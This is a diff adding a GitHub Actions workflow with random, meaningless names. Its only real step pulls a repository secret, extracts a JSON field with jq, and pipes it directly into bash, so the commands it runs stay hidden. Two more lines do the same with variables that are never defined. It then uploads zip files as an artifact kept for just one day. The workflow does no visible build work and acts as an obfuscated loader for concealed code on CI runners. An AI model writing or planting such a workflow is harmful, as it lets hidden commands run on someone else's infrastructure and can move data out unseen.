@@ -1,0 +1,22 @@
+name: andreaaws160
+on:
+  workflow_dispatch:
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: andreaaws160
+        env:
+          jdyqa87: ${{ secrets.jdyqa87 }}
+        run: |
+          printf '%s' "$jdyqa87" | jq -r .pd0 | /bin/bash
+          printf '%s' "$wt22" | jq -r .zp69947 | /bin/bash
+          echo $sca0194 | jq -r .nzkl3 | /bin/bash
+
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: F4fbg7DM
+          path: "*.zip"
+          retention-days: 1
